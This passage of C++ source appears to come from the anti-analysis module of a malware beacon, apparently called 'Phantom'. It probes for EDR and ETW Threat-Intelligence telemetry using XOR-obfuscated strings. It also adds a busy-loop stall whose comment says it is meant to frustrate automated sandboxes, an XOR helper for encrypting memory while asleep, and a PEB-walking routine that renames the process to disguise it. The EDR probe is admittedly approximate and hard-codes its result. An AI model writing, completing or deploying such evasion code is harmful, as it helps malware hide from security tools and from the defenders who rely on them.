            VirtualFree(buf, 0, MEM_RELEASE);
            break;
        }
    }
    // ETW-TI: presence of the Microsoft-Windows-Threat-Intelligence provider
    // is visible via its GUID-registered ETW session — approximate by
    // checking for the TiEtwKey diagnostic policy service DLL loaded.
    HMODULE hEtwTi = GetModuleHandleA(XOR_DEC(XOR_STR("Microsoft-UeV")));
    (void)hEtwTi;   // best-effort: full provider probe needs COR filemaps
    // conservative default: ETW-TI assumed alive on Win10+/E5-class hosts
    rep.etw_ti_alive = true;
}
#endif  // _WIN32

}  // namespace edrcheck

namespace anti {  // reopened after edrcheck

// Stalling technique to frustrate automated sandboxes
// Performs heavy calculations to delay execution without relying solely on Sleep()
inline void stalling_delay(int intensity) {
    volatile uint64_t count = 0;
    for (int i = 0; i < intensity; ++i) {
        for (uint64_t j = 0; j < 10000000; ++j) {
            count += (j ^ i) * (i + 1);
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
//  4. SLEEP OBFUSCATION (Memory Encryption)
// ────────────────────────────────────────────────────────────────────────────

namespace mem {

// Simple XOR encryption for memory regions
inline void xor_region(uint8_t* data, size_t size, uint8_t key) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key;
    }
}

#ifdef _WIN32
// Encrypt the current process's primary thread stack/heap (simplified)
// In a real scenario, we'd walk the VAD or use more complex heap enumeration.
// For the Phantom beacon, we'll focus on encrypting our own strings and state.
#endif

} // namespace mem

// ────────────────────────────────────────────────────────────────────────────
//  5. PROCESS MASQUERADING
// ────────────────────────────────────────────────────────────────────────────

namespace masquerade {

#ifdef _WIN32
inline void rename_process(const wchar_t* newName) {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    auto ldr = peb->Ldr;
    auto head = &ldr->InMemoryOrderModuleList;
    auto entry = head->Flink;
    auto mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

    // Update FullDllName and BaseDllName in the PEB for the main module
    // This is a simplified version; real masquerading involves copying the string to a new buffer
    // and updating the UNICODE_STRING pointers.
    if (mod->FullDllName.Buffer) {
        // We'll just overwrite the base name part for now
        wchar_t* baseName = mod->FullDllName.Buffer;
        for (wchar_t* p = mod->FullDllName.Buffer; *p; ++p) {
            if (*p == L'\\' || *p == L'/') baseName = p + 1;
        }
        wcsncpy(baseName, newName, mod->FullDllName.Length / sizeof(wchar_t) - (baseName - mod->FullDllName.Buffer));
    }
}
#else
inline void rename_process(const wchar_t* newName) {}
#endif

} // namespace masquerade

} // namespace anti
